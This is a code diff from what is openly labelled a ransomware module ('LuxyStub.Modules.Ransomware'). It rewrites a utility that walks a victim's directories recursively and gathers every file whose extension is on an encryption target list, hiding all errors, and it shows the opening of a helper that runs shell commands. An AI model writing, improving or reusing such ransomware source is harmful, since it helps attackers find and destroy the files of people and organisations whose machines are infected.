@@ -9,24 +9,22 @@ namespace LuxyStub.Modules.Ransomware.Components.Utilities
 {
     internal static class Common
     {
-        public static string[] FilesTree(string sDir)
+
+        static public List<string> AllFiles = new List<string>();
+        static public void ParsePath(string path)
         {
-            List<string> filesPath = new List<string>();
             try
             {
-                foreach (string file in Directory.EnumerateFiles(sDir, "*.*", SearchOption.AllDirectories)
-                .Where(s => Settings.EncryptExtensionList.Any(ext => ext == Path.GetExtension(s).Replace(".", ""))))
-                {
-                    Console.WriteLine(file);
-                    filesPath.Add(file);
-                }
+                string[] SubDirs = Directory.GetDirectories(path);
+                AllFiles.AddRange(Directory.GetFiles(path).Where(s => Settings.EncryptExtensionList.Any(ext => ext == Path.GetExtension(s).Replace(".", ""))));
+                foreach (string subdir in SubDirs)
+                    ParsePath(subdir);
             }
-            catch (Exception ex)
+            catch
             {
 
             }
-            string[] lFilesPath = filesPath.ToArray();
-            return lFilesPath;
+
         }
 
         public static void cmd(string commands)
